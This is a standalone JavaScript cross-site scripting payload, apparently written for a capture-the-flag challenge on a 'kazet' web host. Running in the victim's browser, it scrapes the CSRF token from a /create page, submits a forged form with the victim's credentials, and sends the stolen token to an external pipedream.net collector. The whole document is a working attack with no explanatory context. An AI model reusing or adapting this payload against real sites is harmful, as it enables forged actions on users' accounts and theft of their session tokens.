<script>
var x = fetch("https://web.kazet.cc:42448/create")
.then((request) => request.text())
.then((request) => {
  x = request.substr(request.indexOf("csrfmiddlewaretoken") + 28, 64)
  body = "csrfmiddlewaretoken=" + x + "&recipient=T&content=Flagusia&template=normal"
  fetch("https://web.kazet.cc:42448/create", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-GB,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1"
    },
    "referrer": "https://web.kazet.cc:42448/create",
    "body": body,
    "method": "POST",
    "mode": "cors"
});
  requestOptions = {
    method: 'POST',
    body: request.substr(request.indexOf("csrfmiddlewaretoken") + 28, 64)
  };
  fetch("https://eo3trpty9aqag48.m.pipedream.net", requestOptions)
    .then(response => response.text())
    .then(result => console.log(result))
    .catch(error => console.log('error', error));
 
}
)
</script>